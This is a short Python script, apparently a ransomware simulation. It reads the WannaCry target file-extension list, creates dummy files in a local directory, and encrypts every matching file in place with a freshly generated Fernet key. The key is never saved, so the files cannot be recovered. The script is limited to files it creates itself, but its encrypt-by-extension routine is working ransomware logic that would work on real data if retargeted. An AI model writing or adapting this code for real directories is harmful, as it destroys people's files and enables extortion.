import os
import glob
from cryptography.fernet import Fernet

DIR_TO_ENCRYPT = "super_important_data"

def main():
    extensions = load_file_extensions()
    generate_test_files(extensions)
    files = []
    for ext in extensions:
        files.extend(glob.glob(f"{DIR_TO_ENCRYPT}/*.{ext}"))

    key = Fernet.generate_key()
    fernet = Fernet(key)

    for file in files:
        with open(file, "rb+") as f:
            data = fernet.encrypt(f.read())
            f.seek(0)
            f.write(data)
            f.truncate()

def load_file_extensions():
    with open("wannacry_file_extensions.txt") as f:
        return f.read().splitlines()

def generate_test_files(extensions):
    os.makedirs(os.path.dirname(DIR_TO_ENCRYPT + "/"), exist_ok=True)
    for ext in extensions:
        if not os.path.exists('/tmp/test'):
            path = f"{DIR_TO_ENCRYPT}/encrypt_me_daddy.{ext}"
            with open(path, 'w+') as f:
                f.write("TOP SECRET")

if __name__ == "__main__":
    main()
